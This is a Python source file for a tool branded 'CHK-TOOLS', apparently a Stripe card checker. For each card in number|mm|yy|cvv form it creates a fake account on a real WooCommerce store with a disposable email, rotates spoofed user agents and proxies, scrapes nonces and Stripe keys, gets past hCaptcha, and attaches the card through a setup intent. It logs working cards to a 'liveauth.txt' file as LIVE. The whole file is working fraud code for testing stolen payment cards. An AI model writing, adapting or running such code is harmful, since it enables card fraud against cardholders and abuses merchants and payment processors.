                idx += 1
                colored_text += f"{rgb_to_ansi(r, g, b)}{char}"

    return colored_text + "\033[0m"


UA = [
    "Mozilla/5.0 (Linux; U; Android 11; fr-fr; TECNO KG6 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36 PHX/10.4",
    "Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Mobile Safari/537.36 OPR/70.3.3653.66287",
    "Mozilla/5.0 (Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 11; rv:120.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPad; CPU OS 16_0; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 12) AppleWebKitSafari/605.1.15 (KHTML, like Gecko) Version/16.0 SafariSafari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; rv:120.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPad; CPU OS 16_0; rv:120.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKitSafari/605.1.15 (KHTML, like Gecko) Version/16.0 SafariSafari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 16_0; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 11; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/118.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 12; rv:120.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKitSafari/605.1.15 (KHTML, like Gecko) Version/16.0 SafariSafari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKitSafari/604.1 (KHTML, like Gecko) Version/16.0 SafariSafari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_0; rv:120.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKitSafari/603.1 (KHTML, like Gecko) Version/16.0 SafariSafari/603.1",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 2201116TG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36  trill_2022502040 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/musical_ly app_version/25.2.4 ByteLocale/fr ByteFullLocale/fr Region/DZ BytedanceWebview/d8a21c6",
    "Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36 Instagram 241.1.0.18.114 Android (29/10; 440dpi; 1080x2168; Xiaomi/Redmi; Redmi Note 9 Pro; curtana; qcom; en_US; 379517355)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6355.205 Safari/537.36 OPR/105.0.4282.192",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6282.209 Safari/537.36 OPR/108.0.4509.57",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Safari/537.36 RuxitSynthetic/1.0 v114827300649 t3133949698825682894 atha027a982 altpub cmb= cvct=507defgijmoqtvx ciub=.*funds.eatonvance.com/includes/LoadDocument.php.* cvcv=2 cvcx=50 cvcit=1000 smf=0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.2; rb.gy/oupwis; c1875616ae) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6278.215 Safari/537.36 OPR/103.0.4308.111",
]

GRADIENT_ROTATIONS = [
    ["#6a11cb", "#2575fc", "#00f2fe"],
    ["#1e3c72", "#2a5298", "#00c6ff"],
    ["#8e2de2", "#4a00e0", "#00c3ff"],
    ["#89f7fe", "#66a6ff", "#6dd5ed"],
    ["#fbc2eb", "#a6c1ee", "#cfd9df"],
    ["#a1ffce", "#faffd1", "#c2e9fb"],
    ["#e0c3fc", "#8ec5fc", "#b9deed"],
]


def pick_gradient() -> list[str]:
    return random.choice(GRADIENT_ROTATIONS)


def getstring(text: str, prefix: str, suffix: str) -> str:
    start = text.find(prefix)
    if start == -1:
        return ""
    start += len(prefix)
    end = text.find(suffix, start)
    return text[start:end] if end != -1 else ""


def gstr(t: str, p: str, s: str) -> str:
    if p not in t:
        return ""
    a = t.find(p) + len(p)
    b = t.find(s, a)
    return t[a:b] if b != -1 else ""


def sget(t: str, main: tuple[str, str, str], *subs: tuple[str, str, str]) -> dict:
    r = {}
    k, p, s = main
    v = gstr(t, p, s)
    if not v:
        return {k: ""}
    r[k] = v
    for k, p, s in subs:
        r[k] = gstr(t, p, s)
    return r


def generate_password(min_length=8, max_length=16):
    length = random.randint(min_length, max_length)

    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    digits = string.digits
    symbols = "!@#$%^&*()-_=+[]{}|;:,.<>?/"

    password = [
        random.choice(lower),
        random.choice(upper),
        random.choice(digits),
        random.choice(symbols),
    ]

    all_chars = lower + upper + digits + symbols
    password += random.choices(all_chars, k=length - len(password))

    random.shuffle(password)

    return "".join(password)


def format_ts(dt: datetime, *, fmt: str = "%Y-%m-%dT%H:%M:%SZ") -> str:
    """Return UTC timestamp in ISO-8601 Z format."""
    return dt.astimezone(timezone.utc).strftime(fmt)


def sleep_random(min_seconds=1.5, max_seconds=8.0):
    delay = random.uniform(min_seconds, max_seconds)
    time.sleep(delay)
    return delay


def check(card, sess, proxy_list=None):
    session_uuid = str(uuid.uuid4())
    GUID = str(uuid.uuid4())
    MUID = str(uuid.uuid4())
    SID = str(uuid.uuid4())
    cardnum, mm, yyyy, cvv = (str(s).strip() for s in card.strip().split("|"))
    mm = mm.zfill(2)
    yy = str(yyyy)[-2:].zfill(2)  # --> Format tahun 2 digit
    # yym = ("20"+yyyy if len(yyyy)==2 else yyyy.zfill(4))  #--> Format tahun 4 digit
    cvv = cvv[:4]
    bin = cardnum[:6]

    cardfull = f"{cardnum}|{mm}|{yy}|{cvv}"

    password = generate_password()
    delay = sleep_random()

    username_chars = string.ascii_lowercase + string.digits + "._"
    alnum = string.ascii_lowercase + string.digits
    min_user_len, max_user_len = 6, 12
    length = secrets.choice(range(min_user_len, max_user_len + 1))
    first = secrets.choice(alnum)
    last = secrets.choice(alnum)
    middle = []
    prev = ""
    for _ in range(max(0, length - 2)):
        ch = secrets.choice(username_chars)
        if prev in "._" and ch in "._":
            ch = secrets.choice(alnum)
        middle.append(ch)
        prev = ch
    base = first + "".join(middle) + last
    uniq = uuid.uuid4().hex[:4]
    username = (base[: -len(uniq)] + uniq)[:length]
    timeout = 15
    max_retries = 5

    email_domains = [
        "startmail.com",
        "runbox.com",
        "posteo.de",
        "openmailbox.org",
        "safe-mail.net",
        "keemail.me",
        "mykolab.com",
        "eclipso.eu",
        "neomailbox.com",
        "mailbox.org",
        "msgsafe.io",
        "torguard.tg",
        "vfemail.net",
        "scryptmail.com",
        "luxsci.com",
        "onmail.com",
        "simplelogin.io",
        "anonaddy.com",
        "duck.com",
        "pm.me",
        "swissmail.org",
        "kolabnow.com",
        "mailnesia.com",
        "spamgourmet.com",
        "mailsac.com",
        "relay.firefox.com",
        "emailondeck.com",
        "moakt.com",
        "maildrop.cc",
        "nowmymail.com",
        "throwawaymail.com",
        "mailcatch.com",
        "mailnull.com",
        "spamavert.com",
        "mail-temporaire.fr",
        "rcpt.at",
        "mailnesia.com",
        "spamfree24.org",
        "temp-mail.io",
        "easytrashmail.com",
        "inboxkitten.com",
        "trashmail.de",
        "wh4f.org",
        "vibemail.net",
        "spamex.com",
        "trbvm.com",
        "getairmail.com",
        "webemail.me",
        "kurzepost.de",
        "lortemail.dk",
        "spambog.com",
        "spambog.ru",
        "yepmail.net",
        "tempail.com",
        "fakeinbox.com",
        "meltmail.com",
        "deadaddress.com",
        "jetable.org",
        "mailhazard.com",
        "tagmymail.com",
    ]
    tempmail = f"{username}@{random.choice(email_domains)}"

    timeunix = str(int(time.time()))[:7]
    timeunixx = str(int(time.time()))
    ts_now = format_ts(datetime.now(timezone.utc))  # ----  2025-09-23 14:56:40

    fake = Faker("en_US")
    first_name = fake.first_name_male()
    last_name = fake.last_name_male()
    email = fake.free_email()
    try:
        zipcode = fake.postal_code()
    except AttributeError:
        zipcode = fake.postcode()
    RotationUserAgents = random.choice(UA)
    proxies_source = proxy_list or []
    tried = set()
    max_attempts = max_retries

    attempt = 0
    while attempt < max_attempts:
        attempt += 1

        if proxies_source:
            if len(tried) >= len(proxies_source):
                break

            proxy = random.choice(proxies_source)
            if proxy in tried:
                continue

            tried.add(proxy)
            proxies = {"http": proxy, "https": proxy}
        else:
            proxies = None
        try:
            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://eromis.com/my-account/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            r = sess.get(
                "https://eromis.com/my-account/",
                headers=headers,
                timeout=timeout,
                proxies=proxies,
            )
            regisNonce = gstr(r.text, 'woocommerce-register-nonce" value="', '"')

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://eromis.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://eromis.com/my-account/",
                "user-agent": RotationUserAgents,
                "x-requested-with": "XMLHttpRequest",
                "Connection": "keep-alive",
            }

            data = {
                "action": "wmc_get_products_price",
                "wc_filter_price": "",
                "wc_filter_price_meta": "",
                "wc_filter_price_tax": "",
                "wc_filter_price_search": "",
                "filter_price_query_vars": "",
                "wc_filter_price_action": "",
            }

            r = sess.post(
                "https://eromis.com/wp-admin/admin-ajax.php",
                headers=headers,
                data=data,
                timeout=timeout,
                proxies=proxies,
            )

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://eromis.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://eromis.com/my-account/",
                "user-agent": RotationUserAgents,
                "x-requested-with": "XMLHttpRequest",
                "Connection": "keep-alive",
            }

            params = {
                "wc-ajax": "get_refreshed_fragments",
            }

            data = {
                "time": timeunixx,
            }

            r = sess.post(
                "https://eromis.com/",
                params=params,
                headers=headers,
                data=data,
                timeout=timeout,
                proxies=proxies,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://eromis.com",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://eromis.com/my-account/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            params = {
                "action": "register",
            }

            data = {
                "username": username,
                "email": tempmail,
                "password": password,
                "email_2": "",
                "bot_prevention": "2025",
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": "https://eromis.com/my-account/payment-methods/",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": "https://eromis.com/my-account/add-payment-method/",
                "wc_order_attribution_session_start_time": ts_now,
                "wc_order_attribution_session_pages": "6",
                "wc_order_attribution_session_count": "2",
                "wc_order_attribution_user_agent": RotationUserAgents,
                "woocommerce-register-nonce": regisNonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }

            r = sess.post(
                "https://eromis.com/my-account/",
                params=params,
                headers=headers,
                data=data,
                timeout=timeout,
                proxies=proxies,
            )
            if r.status_code not in (200, 301, 302):
                with print_lock:
                    print(
                        f" {Fore.RED}- {cardfull} {Fore.LIGHTWHITE_EX}- {Fore.LIGHTRED_EX}{r.status_code} {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}Register failed, Waiting {Fore.MAGENTA}{delay:.2f}s{Fore.LIGHTYELLOW_EX} before retrying...{Style.RESET_ALL}"
                    )

                if attempt < max_retries:
                    sleep_random()
                    continue
                else:
                    return None, False

            orcanonce = gstr(
                r.text,
                'var orca_wc_product_data = {"ajax_url":"https:\\/\\/eromis.com\\/wp-admin\\/admin-ajax.php","nonce":"',
                '"',
            )

            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://eromis.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://eromis.com/my-account/?action=register",
                "user-agent": RotationUserAgents,
                "x-requested-with": "XMLHttpRequest",
                "Connection": "keep-alive",
            }

            data = {
                "action": "orca_track_product",
                "product_id": "0",
                "is_product_category": "false",
                "category_id": "0",
                "timestamp": ts_now,
                "_ajax_nonce": orcanonce,
            }

            r = sess.post(
                "https://eromis.com/wp-admin/admin-ajax.php",
                headers=headers,
                data=data,
                timeout=timeout,
                proxies=proxies,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://eromis.com/my-account/?action=register",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            r = sess.get(
                "https://eromis.com/my-account/payment-methods/",
                headers=headers,
                timeout=timeout,
                proxies=proxies,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://eromis.com/my-account/payment-methods/",
                "upgrade-insecure-requests": "1",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            r = sess.get(
                "https://eromis.com/my-account/add-payment-method/",
                headers=headers,
                timeout=timeout,
                proxies=proxies,
            )
            setupnonce = gstr(r.text, 'createSetupIntentNonce": "', '"') or gstr(
                r.text, 'createSetupIntentNonce":"', '"'
            )
            publishedKey = gstr(r.text, 'publishableKey": "', '"') or gstr(
                r.text, 'publishableKey":"', '"'
            )
            accountId = gstr(r.text, 'accountId": "', '"') or gstr(
                r.text, 'accountId":"', '"'
            )
            woocommerce_add_payment_method_nonce = gstr(
                r.text, 'woocommerce-add-payment-method-nonce" value="', '"'
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            r = sess.get(
                f"https://api.stripe.com/v1/elements/sessions?client_betas[0]=card_country_event_beta_1&deferred_intent[mode]=setup&deferred_intent[currency]=usd&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=usd&key={publishedKey}&_stripe_account={accountId}&elements_init_source=stripe.elements&referrer_host=eromis.com&stripe_js_id={session_uuid}&locale=en&type=deferred_intent",
                headers=headers,
                timeout=timeout,
                proxies=proxies,
            )
            sitekey = gstr(r.text, 'link_hcaptcha_site_key": "', '"') or gstr(
                r.text, 'link_hcaptcha_site_key":"', '"'
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            r = sess.get(
                "https://merchant-ui-api.stripe.com/link/get-cookie",
                headers=headers,
                timeout=timeout,
                proxies=proxies,
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            data = {
                "request_surface": "web_payment_element",
                "email_address": tempmail,
                "email_source": "default_value",
                "session_id": session_uuid,
                "key": publishedKey,
                "_stripe_account": accountId,
            }

            response = sess.post(
                "https://api.stripe.com/v1/consumers/sessions/lookup",
                headers=headers,
                data=data,
                timeout=timeout,
                proxies=proxies,
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "text/plain",
                "origin": "https://newassets.hcaptcha.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://newassets.hcaptcha.com/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            params = {
                "v": "1d4815d5af3fbb981639e1413c5e9a397eeafcf8",
                "host": "b.stripecdn.com",
                "sitekey": sitekey,
                "sc": "1",
                "swa": "1",
                "spst": "0",
            }

            r = sess.post(
                "https://api.hcaptcha.com/checksiteconfig",
                params=params,
                headers=headers,
                timeout=timeout,
                proxies=proxies,
            )
            hcaptchatoken = "P1_" + gstr(r.text, 'req":"', '"') or gstr(
                r.text, 'req": "', '"'
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": RotationUserAgents,
                "Connection": "keep-alive",
            }

            data = f"billing_details[name]=+&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]={zipcode}&type=card&card[number]={cardnum}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2Fc094bc56cb%3B+stripe-js-v3%2Fc094bc56cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Feromis.com&time_on_page={timeunix}&client_attribution_metadata[client_session_id]=6ba52e41-dca8-4a55-91f2-f44fe0fa56a1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a55da14f-aa8c-44bb-a408-038d436e4bd8&guid={GUID}&muid={MUID}&sid={SID}&key={publishedKey}&_stripe_account={accountId}&radar_options[hcaptcha_token]={hcaptchatoken}"

            r = sess.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=headers,
                data=data,
                timeout=timeout,
                proxies=proxies,
            )
            if r.status_code != 200:
                mesx = gstr(r.text, 'message": "', '"')
                with print_lock:
                    print(
                        f"{Fore.LIGHTWHITE_EX} - {Fore.LIGHTRED_EX}{cardfull} {Fore.LIGHTWHITE_EX}- {Fore.YELLOW}{r.status_code} "
                        f"{Fore.LIGHTWHITE_EX}- {Fore.LIGHTRED_EX}{mesx}{Style.RESET_ALL}"
                    )
                return r, False

            idpm = "pm_" + gstr(r.text, 'id": "pm_', '"')

            headers = {
                "accept": "application/json, text/plain, text/html, */*",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "origin": "https://eromis.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "Upgrade-Insecure-Requests": "1",
                "referer": "https://eromis.com/my-account/add-payment-method/",
                "user-agent": RotationUserAgents,
            }

            files = {
                "action": (None, "create_setup_intent"),
                "wcpay-payment-method": (None, idpm),
                "_ajax_nonce": (None, setupnonce),
            }

            r = sess.post(
                "https://eromis.com/wp-admin/admin-ajax.php",
                headers=headers,
                files=files,
                proxies=proxies,
                allow_redirects=False,
                timeout=timeout,
            )

            text = r.text
            try:
                rjson = r.json()
            except Exception:
                rjson = {}

            if "succeeded" in text or '"status":"succeeded"' in text:
                status = "succeeded"
            else:
                status = rjson.get("data", {}).get("status")

            # Card Approved
            if status == "succeeded":
                with print_lock:
                    print(
                        f"{Fore.LIGHTGREEN_EX} - {cardfull} {Fore.LIGHTWHITE_EX}- {Fore.GREEN}{r.status_code} "
                        f"{Fore.LIGHTWHITE_EX}- {Fore.GREEN}Card approved.{Style.RESET_ALL}"
                    )
                with file_lock:
                    with open("liveauth.txt", "a", encoding="utf-8") as f:
                        f.write(
                            f"{cardnum}|{mm}|{yy}|{cvv} - LIVE - CHECKED BY T.ME/xqndrs\n"
                        )
                        f.flush()
                return r, True

            # Card Requires Action
            elif rjson.get("success") is True and status == "requires_action":
                with print_lock:
                    print(
                        f"{Fore.LIGHTYELLOW_EX} - {cardfull} {Fore.LIGHTWHITE_EX}- {Fore.YELLOW}{r.status_code} "
                        f"{Fore.LIGHTWHITE_EX}- {Fore.YELLOW}Card requires action (3DS/AVS).{Style.RESET_ALL}"
                    )
                return r, False

            elif rjson.get("success") is True:
                mesg = rjson.get("data", {}).get("message") or "Card declined."
                with print_lock:
                    print(
                        f"{Fore.LIGHTWHITE_EX} - {Fore.LIGHTRED_EX}{cardfull} {Fore.LIGHTWHITE_EX}- {Fore.YELLOW}{r.status_code} "
                        f"{Fore.LIGHTWHITE_EX}- {Fore.LIGHTRED_EX}{mesg}{Style.RESET_ALL}"
                    )
                return r, False

            # Fallback for other response errors
            mesgx = rjson.get("message") or gstr(text, 'message":"Error: ', '"') or text

            with print_lock:
                print(
                    f"{Fore.LIGHTWHITE_EX} - {Fore.LIGHTRED_EX}{cardfull} {Fore.LIGHTWHITE_EX}- {Fore.YELLOW}{r.status_code} "
                    f"{Fore.LIGHTWHITE_EX}- {Fore.LIGHTRED_EX}{mesgx}{Style.RESET_ALL}"
                )

            return r, False

        except KeyboardInterrupt:
            sys.exit(1)

        except Exception as e:
            err_msg = str(e).lower()
            hint = "Unknown error"
            error_type = type(e).__name__

            if isinstance(e, ConnectTimeout):
                hint = "Connection timed out while trying to connect to host."

            elif isinstance(e, ReadTimeout):
                hint = "Server took too long to send data back."

            elif isinstance(e, Timeout):
                hint = "Generic request timeout (connect/read)."

            elif isinstance(e, ConnectionError):
                if "connection reset" in err_msg:
                    hint = "Connection was reset — server may have dropped or rate-limited."
                elif "connection refused" in err_msg:
                    hint = "Connection was refused — service might be down or blocked."
                elif "connection aborted" in err_msg:
                    hint = "Connection aborted — incomplete handshake or TLS drop."
                elif "name or service not known" in err_msg:
                    hint = "DNS resolution failed — domain does not exist or is misconfigured."
                elif "temporarily unavailable" in err_msg or "unreachable" in err_msg:
                    hint = "Server temporarily unavailable or unreachable."
                elif "tunnel connection failed: 402 payment required" in err_msg:
                    hint = "Proxy requires payment — likely a premium proxy or expired account."
                else:
                    hint = "General connection error (network down, proxy issue, etc.)"

            elif isinstance(e, urllib3.exceptions.NewConnectionError):
                hint = "Failed to establish a new connection (DNS, IP block, etc.)"

            elif isinstance(e, urllib3.exceptions.MaxRetryError):
                hint = "Too many retries attempted — likely persistent failure."

            elif isinstance(e, socket.timeout):
                hint = "Socket-level timeout — server not responding."

            elif isinstance(e, socket.gaierror):
                hint = "DNS lookup failed — bad domain or DNS issue."

            elif isinstance(e, socket.error):
                hint = "Low-level socket error — firewall, blocked port, etc."

            elif isinstance(e, requests.exceptions.SSLError) or isinstance(
                e, urllib3.exceptions.SSLError
            ):
                if "certificate verify failed" in err_msg:
                    hint = "SSL verification failed — try verify=False (insecure)."
                else:
                    hint = "General SSL error (misconfig SSL, CA expired, etc.)"

            with print_lock:
                print(
                    f"{Fore.LIGHTRED_EX}- {Fore.LIGHTCYAN_EX}{cardfull} {Fore.LIGHTWHITE_EX}- "
                    f"{Fore.LIGHTRED_EX}{error_type}: {Fore.LIGHTMAGENTA_EX}{e} "
                    f"{Fore.YELLOW}- {hint}{Style.RESET_ALL}"
                )

            retry_keywords = [
                "reset",
                "timeout",
                "temporarily",
                "unreachable",
                "aborted",
            ]

            non_retry_keywords = [
                "402 payment required",
                "proxy requires payment",
            ]

            # Jika error tidak layak retry
            if any(kw in err_msg for kw in non_retry_keywords):
                return None, False

            # Retry jika keyword cocok dan masih ada sisa attempt
            if any(kw in err_msg for kw in retry_keywords):
                if attempt < max_retries:
                    delay = random.uniform(2.5, 5.5)
                    with print_lock:
                        print(
                            f"{Fore.RED}- {Fore.LIGHTYELLOW_EX}{cardfull} {Fore.LIGHTWHITE_EX}- "
                            f"{Fore.LIGHTRED_EX}RETRY {Fore.LIGHTWHITE_EX}- "
                            f"{Fore.LIGHTYELLOW_EX}Waiting {Fore.RED}{delay:.2f}s{Fore.LIGHTYELLOW_EX} before retrying...{Style.RESET_ALL}"
                        )
                    time.sleep(delay)
                    continue
                else:
                    with print_lock:
                        print(
                            f"{Fore.RED}- {Fore.LIGHTYELLOW_EX}{cardfull} {Fore.LIGHTWHITE_EX}- "
                            f"{Fore.LIGHTRED_EX}{r.status_code} {Fore.LIGHTWHITE_EX}- "
                            f"{Fore.LIGHTMAGENTA_EX}FAILED, Max retries reached for {Fore.BLACK}{cardfull}{Style.RESET_ALL}"
                        )
                    return None, False

            return None, False


def load_proxy_list(proxy_input):
    if not proxy_input:
        return []

    proxy_list = []
    schemes = ("http://", "https://", "socks4://", "socks5://")

    raw_proxies = [p.strip() for p in proxy_input.split(",") if p.strip()]

    for proxy in raw_proxies:
        normalized = None

        # Check if proxy already has scheme
        if proxy.startswith(schemes):
            normalized = proxy

        else:
            # Try to parse known formats
            if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):  # IP:PORT
                normalized = "http://" + proxy

            elif re.match(
                r"^[^:@]+:[^@]+@\d+\.\d+\.\d+\.\d+:\d+$", proxy
            ):  # user:pass@ip:port
                normalized = "http://" + proxy

            elif re.match(
                r"^\d+\.\d+\.\d+\.\d+:\d+:[^:]+:.+$", proxy
            ):  # ip:port:user:pass
                host, port, user, pwd = proxy.split(":")
                user = urllib.parse.quote(user)
                pwd = urllib.parse.quote(pwd)
                normalized = f"http://{user}:{pwd}@{host}:{port}"

        if normalized:
            proxy_list.append(normalized)
        else:
            print(
                f"{Fore.RED}[!] Skipping invalid proxy format: {proxy}{Style.RESET_ALL}"
            )

    return proxy_list


def main():
    os.system("cls" if os.name == "nt" else "clear")
    banner = pyfiglet.figlet_format("CHK-TOOLS", font="ansi_shadow")
    gradient = pick_gradient()
    print(color_gradient_text(banner, gradient))

    print(
        f"                   \033[33;41m Stripe auth CVV non-sk {Style.RESET_ALL}\n\n"
    )
    print("- " * 35)
    print_info()
    print("- " * 35)
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Author {Fore.LIGHTCYAN_EX}: {Fore.YELLOW}Kiansantang DEV"
    )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Github {Fore.LIGHTCYAN_EX}: {Fore.YELLOW}github.com/KianSantang777"
    )
    print(
